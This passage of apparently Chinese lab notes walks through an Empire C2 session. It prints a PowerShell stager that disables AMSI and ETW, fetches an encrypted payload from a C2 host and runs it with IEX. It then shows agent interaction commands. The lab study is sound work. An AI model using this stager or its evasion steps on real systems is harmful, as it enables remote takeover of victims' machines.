\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000N\u0000e\u0000t\u0000.\u0000C\u0000r\u0000e\u0000d\u0000e\u0000n\u0000t\u0000i\u0000a\u0000l\u0000C\u0000a\u0000c\u0000h\u0000e\u0000]\u0000:\u0000:\u0000D\u0000e\u0000f\u0000a\u0000u\u0000l\u0000t\u0000N\u0000e\u0000t\u0000w\u0000o\u0000r\u0000k\u0000C\u0000r\u0000e\u0000d\u0000e\u0000n\u0000t\u0000i\u0000a\u0000l\u0000s\u0000;\u0000$\u0000S\u0000c\u0000r\u0000i\u0000p\u0000t\u0000:\u0000P\u0000r\u0000o\u0000x\u0000y\u0000 \u0000=\u0000 \u0000$\u0000w\u0000c\u0000.\u0000P\u0000r\u0000o\u0000x\u0000y\u0000;\u0000$\u0000K\u0000=\u0000[\u0000S\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000T\u0000e\u0000x\u0000t\u0000.\u0000E\u0000n\u0000c\u0000o\u0000d\u0000i\u0000n\u0000g\u0000]\u0000:\u0000:\u0000A\u0000S\u0000C\u0000I\u0000I\u0000.\u0000G\u0000e\u0000t\u0000B\u0000y\u0000t\u0000e\u0000s\u0000(\u0000&#39;\u0000H\u0000u\u0000v\u0000,\u00003\u0000g\u0000t\u0000s\u0000c\u0000}\u0000#\u0000_\u0000E\u0000:\u0000f\u0000F\u0000X\u0000w\u0000n\u00002\u0000b\u0000U\u0000P\u0000V\u0000|\u0000i\u0000M\u0000e\u00000\u0000+\u00005\u0000R\u0000&#39;\u0000)\u0000;\u0000$\u0000R\u0000=\u0000{\u0000$\u0000D\u0000,\u0000$\u0000K\u0000=\u0000$\u0000A\u0000r\u0000g\u0000s\u0000;\u0000$\u0000S\u0000=\u00000\u0000.\u0000.\u00002\u00005\u00005\u0000;\u00000\u0000.\u0000.\u00002\u00005\u00005\u0000|\u0000%\u0000{\u0000$\u0000J\u0000=\u0000(\u0000$\u0000J\u0000+\u0000$\u0000S\u0000[\u0000$\u0000_\u0000]\u0000+\u0000$\u0000K\u0000[\u0000$\u0000_\u0000%\u0000$\u0000K\u0000.\u0000C\u0000o\u0000u\u0000n\u0000t\u0000]\u0000)\u0000%\u00002\u00005\u00006\u0000;\u0000$\u0000S\u0000[\u0000$\u0000_\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000J\u0000]\u0000=\u0000$\u0000S\u0000[\u0000$\u0000J\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000_\u0000]\u0000}\u0000;\u0000$\u0000D\u0000|\u0000%\u0000{\u0000$\u0000I\u0000=\u0000(\u0000$\u0000I\u0000+\u00001\u0000)\u0000%\u00002\u00005\u00006\u0000;\u0000$\u0000H\u0000=\u0000(\u0000$\u0000H\u0000+\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000)\u0000%\u00002\u00005\u00006\u0000;\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000H\u0000]\u0000=\u0000$\u0000S\u0000[\u0000$\u0000H\u0000]\u0000,\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000;\u0000$\u0000_\u0000-\u0000b\u0000x\u0000o\u0000r\u0000$\u0000S\u0000[\u0000(\u0000$\u0000S\u0000[\u0000$\u0000I\u0000]\u0000+\u0000$\u0000S\u0000[\u0000$\u0000H\u0000]\u0000)\u0000%\u00002\u00005\u00006\u0000]\u0000}\u0000}\u0000;\u0000$\u0000w\u0000c\u0000.\u0000H\u0000e\u0000a\u0000d\u0000e\u0000r\u0000s\u0000.\u0000A\u0000d\u0000d\u0000(\u0000\&quot;\u0000C\u0000o\u0000o\u0000k\u0000i\u0000e\u0000\&quot;\u0000,\u0000\&quot;\u0000c\u0000H\u0000G\u0000A\u0000f\u0000d\u0000L\u0000Z\u0000D\u0000C\u0000E\u0000t\u0000L\u0000M\u0000K\u0000=\u0000l\u0000L\u0000q\u00008\u0000U\u0000w\u0000i\u0000E\u0000u\u0000z\u0000v\u0000I\u0000Q\u0000D\u00004\u0000j\u00007\u0000p\u00006\u0000I\u0000J\u0000s\u0000h\u0000i\u0000i\u00001\u0000E\u0000=\u0000\&quot;\u0000)\u0000;\u0000$\u0000d\u0000a\u0000t\u0000a\u0000=\u0000$\u0000w\u0000c\u0000.\u0000D\u0000o\u0000w\u0000n\u0000l\u0000o\u0000a\u0000d\u0000D\u0000a\u0000t\u0000a\u0000(\u0000$\u0000s\u0000e\u0000r\u0000+\u0000$\u0000t\u0000)\u0000;\u0000$\u0000i\u0000v\u0000=\u0000$\u0000d\u0000a\u0000t\u0000a\u0000[\u00000\u0000.\u0000.\u00003\u0000]\u0000;\u0000$\u0000d\u0000a\u0000t\u0000a\u0000=\u0000$\u0000d\u0000a\u0000t\u0000a\u0000[\u00004\u0000.\u0000.\u0000$\u0000d\u0000a\u0000t\u0000a\u0000.\u0000l\u0000e\u0000n\u0000g\u0000t\u0000h\u0000]\u0000;\u0000-\u0000j\u0000o\u0000i\u0000n\u0000[\u0000C\u0000h\u0000a\u0000r\u0000[\u0000]\u0000]\u0000(\u0000&amp;\u0000 \u0000$\u0000R\u0000 \u0000$\u0000d\u0000a\u0000t\u0000a\u0000 \u0000(\u0000$\u0000I\u0000V\u0000+\u0000$\u0000K\u0000)\u0000)\u0000|\u0000I\u0000E\u0000X\u0000&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>里面的 <code>\u0000</code> 无用, 去除 <code>\u0000</code> 并规范化后得到:</p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">If</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">$PSVersionTable</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">.PSVersion.Major</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -ge</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    $Ref</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Ref</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">].Assembly.GetType(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;System.Management.Automation.AmsiUtils&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    $Ref.GetField</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;amsiInitFailed&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;NonPublic,Static&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).Setvalue(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">$Null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">$true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">System.Diagnostics.Eventing.EventProvider</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">].GetField(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;m_enabled&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;NonPublic,Instance&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).SetValue([</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Ref</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">].Assembly.GetType(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).GetField(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;etwProvider&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;NonPublic,Static&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">).GetValue(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">$null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">System.Net.ServicePointManager</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::Expect100Continue </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$wc</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> New-Object</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> System.Net.WebClient;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$u</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$ser</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> $</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">([</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Text.Encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::Unicode.GetString([</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Convert</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::FromBase64String(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA==&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)));</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$t</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;/login/process.php&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$wc.Headers.Add</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;User-Agent&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$u</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$wc.Proxy</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">System.Net.WebRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::DefaultWebProxy;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$wc.Proxy.Credentials</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">System.Net.CredentialCache</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::DefaultNetworkCredentials;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Script</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">:Proxy</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $wc.Proxy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$K</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">System.Text.Encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]::ASCII.GetBytes(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$R</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    $D</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$K</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> $Args; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">..</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">255</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">..</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">255</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">        $J</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$J</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[$_] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $K</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[$_ </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $K.Count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 256</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[$_], </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$J</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$J</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">], </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[$_]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    };</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">    $D</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$I</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$I</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 256</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$H</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$H</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$I</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 256</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$I</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">], </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$H</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$H</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">], </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$I</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]; $_</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">bxor</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$I</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">+</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$H</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 256</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$wc.Headers.Add</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Cookie&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E=&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $wc.DownloadData</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$ser</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$iv</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">..</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">..</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$data.length</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">];</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-join [</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Char</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[]](&amp; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$R</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $data</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$IV</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> +</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $K</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)) | IEX</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></blockquote><hr><h4 id="执行命令以上线主机" tabindex="-1"><a class="header-anchor" href="#执行命令以上线主机"><span>执行命令以上线主机</span></a></h4><p>执行完后可以获得一行命令, 将其拷贝下来, 然后在靶机侧执行该命令</p><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282311522.png" alt="image-20230528231125441"></p><p>也可以使用 CMD, 这里被防火墙拦了, 作为测试使用, 本次先关闭防火墙以及实时防护</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282312421.png" alt="image-20230528231228333"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282312455.png" alt="image-20230528231248365"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282313919.png" alt="image-20230528231302831"></p><p>关掉之后就可以成功执行了</p></blockquote><p>成功执行后 empire cleint 会收到一条上线消息:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282314124.png" alt="image-20230528231407044"></p><p>使用 agents 查看当前上线的主机并可以使用 interact 命令与其交互</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">agents</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">interact</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [主机名]</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282315493.png" alt="image-20230528231522462"></p><p>可以使用 <code>info</code> 命令看下该主机的基本信息</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282315344.png" alt="image-20230528231559275"></p><p>也可以弹个计算器:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">shell</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> calc.exe</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>需要稍微等待一会儿等待命令执行, 执行完会显示 received</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282317086.png" alt="image-20230528231709071"></p><p>在靶机侧可以看到计算器已经弹出来了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282317516.png" alt="image-20230528231735406"></p></blockquote><p>可以使用 kill 命令关闭与此 agent 的连接</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 需要先回到 agents</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">agents</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">kill</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [主机名]</span></span>
